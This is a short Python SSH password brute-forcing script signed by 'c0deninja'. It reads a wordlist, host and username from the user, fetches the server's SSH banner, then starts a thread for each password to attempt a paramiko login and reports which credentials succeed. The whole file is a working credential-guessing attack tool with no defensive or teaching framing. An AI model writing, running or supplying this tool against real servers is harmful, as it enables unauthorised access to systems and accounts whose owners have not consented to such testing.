#!/usr/bin/python3

import paramiko, time, threading, socket, sys

# SSHbrute script by c0deninja


wordlist = input("Enter wordlist: ")
host = input("Enter Host: ")
user = input("Enter User: ")

def sshbanner():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, 22))
	data = s.recv(1024)
	print (data.strip())

sshbanner()

try:
	file = open(wordlist, 'r')
	passlist = file.readlines()
except IOError:
	print ("File not Found!!")

def ssh_connect(host, user, passwords):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	try:
		ssh.connect(host, username=user, password=passwords)
	except paramiko.AuthenticationException:
		print ("Failed: %s:%s" % (user,passwords))
	else:
		print ("Found: %s:%s" % (user,passwords))
	ssh.close()

	return
for password in passlist:
	passwords = password.strip()
	t = threading.Thread(target=ssh_connect, args=(host, user, passwords))
	t.start()
	time.sleep(0.4)
file.close()
